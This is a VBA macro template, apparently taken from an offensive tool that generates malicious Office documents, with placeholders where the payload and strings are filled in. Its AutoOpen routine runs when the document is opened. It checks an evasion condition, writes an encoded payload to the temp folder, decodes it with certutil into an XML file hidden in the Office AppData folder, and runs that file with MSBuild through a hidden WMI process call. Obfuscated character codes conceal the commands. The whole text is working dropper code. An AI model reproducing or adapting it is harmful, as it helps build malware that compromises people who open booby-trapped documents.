[use:payload_wrapper]
[use:exec]
[use:init_wmi]
[use:init_properties]
[use:random_str]

Sub AutoOpen()
	Dim var1 As Object
	Dim var2 As Object
	Dim var3 as String
	Dim var4 as String

	Set var1 = CreateObject(decode("{[Scripting.FileSystemObject]}"))
	Set var2 = var1.GetSpecialFolder(2)
	Dim var5 as String
	Dim var6 as String
	Dim var7 as String
	Dim var8 as String	

	var4 = decode("{[certutil]}")
	var7 = decode("{[exe]}")
	var8 = decode("{[msbuild]}")
	var3 = CStr(Environ(decode("{[USERPROFILE]}")))

	Dim var9 as String
	Dim var10 as String
	Dim var11 as String
	Dim var12 as String
	Dim var13 As Object
	Dim var14 As String	

	var12 = CStr(Environ(decode("{[WINDIR]}")))
	var9 = var3 & decode("{[\AppData\Local\Microsoft\Office\]}")
	var10 = var12 & decode("{[\Microsoft.NET\Framework\v4.0.30319\]}")
	var14 = var9 & random_str(8) & decode("{[.xml]}")
	var11 = random_str(6) & decode("{[.txt]}")

	Dim var15 As String
	Dim var16 As Object
	Dim var17 As Integer
	Dim var18 As String
	Dim var21 as String
			
	var21 = func_evasion_domain()
	If (var21 = "bool1") Then
	    var17 = [int1]
	    var18 = payload_wrapper("data1")
	    Set var13 = var1.CreateTextFile(var2 & var11, True)
	    var13.WriteLine var18
	    var13.Close

	    var5 = var4 & cHRW(46) & var7 & ChrW(32) & chRW(45) & chRW(100) & chRW(101) & chRW(99) & chRW(111) & chRW(100) & chRW(101) & ChrW(32) & chRW(45) & ChrW(102) & ChrW(32) & var2 & var11 & ChrW(32) & var14

	    Dim var19 As String
	    Dim var20 As String
						
	    var15 = init_wmi("data1")
	    Set var16 = GetObject(var15)
	    var5 = exec(var16, var5, var17)
	    var20 = var10 & var8 & cHrW(46) & var7 & cHRw(32) & var14
	    var19 = exec(var16,var20,var17)
	End If	
End Sub

Function payload_wrapper(payload_wrapper1 As String) As String
	Dim payload_wrapper2 As String
	[payload]
	payload_wrapper2 = [payload_args]
	payload_wrapper2 = decode(payload_wrapper2)
	payload_wrapper = payload_wrapper2
End Function

Function init_properties() As String
	Dim init_properties1 As String
	init_properties1 = decode("{[winmgmts:root/cimv2]}")
	init_properties = init_properties1
End Function

Function exec(exec1 As Object, exec2 As String, exec3 As Integer) As String
	Dim exec4 As String
	Dim exec5 As Integer
	Dim exec13 As Integer
	Dim exec14 As Integer
	exec5 = [smallint1]
	exec4 = exec2
	If exec3 > exec5 Then
	   Set exec10 = GetObject(init_properties())
	   Set exec11 = exec10.Get(decode("{[Win32_ProcessStartup]}"))
	   Set exec12 = exec11.SpawnInstance_
	   exec5 = exec3 - exec3
	   exec5 = exec5 + 12
	   exec12.ShowWindow = exec5
	   exec14 = exec1.Create(exec4, null, exec12, exec13)
	End If
	exec4 = "exec6"
	exec = exec4
End Function

Function init_wmi(init_wmi1 As String) As String
	Dim init_wmi2 As String
	init_wmi2 = decode("{[winmgmts:Win32_Process]}")
	init_wmi = init_wmi2
End Function

Function random_str(random_str1 As Integer) As String
	Dim random_str2 As Variant
	Dim random_str3 As Long
	Dim random_str4 As String
	random_str2 = Array(cHrW(97),cHrW(98),cHrW(99),cHrW(100),cHrW(101),cHrW(102),cHrW(103),cHrW(104),cHrW(105),cHrW(106),cHrW(107),cHrW(108),cHrW(109),cHrW(110),cHrW(111),cHrW(112),cHrW(113),cHrW(114),cHrW(115),cHrW(116),cHrW(117),cHrW(118),cHrW(119),cHrW(120),cHrW(121),cHrW(122),cHrW(48),cHrW(49),cHrW(50),cHrW(51),cHrW(52),cHrW(53),cHrW(54),cHrW(55),cHrW(56),cHrW(57),cHrW(65),cHrW(66),cHrW(67),cHrW(68),cHrW(69),cHrW(70),cHrW(71),cHrW(72),cHrW(73),cHrW(74),cHrW(75),cHrW(76),cHrW(77),cHrW(78),cHrW(79),cHrW(80),cHrW(81),cHrW(82),cHrW(83),cHrW(84),cHrW(85),cHrW(86),cHrW(87),cHrW(88),cHrW(89),cHrW(90))
	For random_str3 = 1 To random_str1
	    random_str4 = random_str4 & random_str2(Int((UBound(random_str2) - LBound(random_str2) + 1) * Rnd + LBound(random_str2)))
	Next random_str3
	random_str = random_str4
End Function
